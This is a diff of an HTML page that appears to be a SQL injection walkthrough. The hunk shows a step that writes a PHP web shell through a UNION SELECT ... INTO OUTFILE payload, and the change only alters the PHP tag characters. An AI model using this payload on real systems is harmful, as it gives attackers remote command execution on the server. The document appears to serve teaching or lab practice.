@@ -200,7 +200,7 @@ FROM mysql.user-- -
       <h2 class="text-2xl font-semibold mb-4">Step 8: Writing a PHP Web-Shell</h2>
       <p class="mb-4">Attempt an OUTFILE injection to write a PHP shell:</p>
       <pre class="bg-gray-200 p-4 rounded mb-4 overflow-x-auto text-sm">
-' UNION SELECT 1, "<?php echo shell_exec($_REQUEST['cmd']); ?>", 3, 4, 5
+' UNION SELECT 1, "<|?php echo shell_exec($_REQUEST['cmd']); ?|>", 3, 4, 5
 INTO OUTFILE '/var/www/html/dashboard/webshell.php'-- -
       </pre>
       <div class="mb-8">
